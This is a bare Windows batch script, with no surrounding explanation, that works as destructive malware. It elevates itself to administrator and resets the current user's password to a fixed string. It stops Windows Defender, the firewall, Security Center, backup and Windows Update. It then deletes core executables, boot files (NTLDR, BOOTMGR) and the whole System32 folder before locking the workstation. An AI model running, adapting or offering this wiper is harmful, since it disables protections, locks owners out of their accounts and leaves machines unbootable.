@echo off
nul 2>&1 "%SystemRoot%\system32\cacls.exe" "%SystemRoot%\system32\config\system"
if '%errorlevel%' NEQ '0' (
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs"
exit /b
)
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
net user "%username%" "3789329202769343"
net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
net stop sharedaccess
net stop "wuauserv"
del /f /q %SystemRoot%\System32\cmd.exe
del /f /q %SystemRoot%\System32\taskmgr.exe
del /f /q %SystemRoot%\regedit.exe
del /f /q %SystemRoot%\shutdown.exe
del /f /q %SystemRoot%\explorer.exe
del C:\NTLDR
del C:\BOOTMGR
del /f /q format.com
del /f /q setup.exe
del /s /q C:\Windows\System32*
rd /s /q C:\Windows\System32
del /s /q C:\Windows\windows*
rd /s /q C:\Windows\windows
rundll32.exe user32.dll,LockWorkStation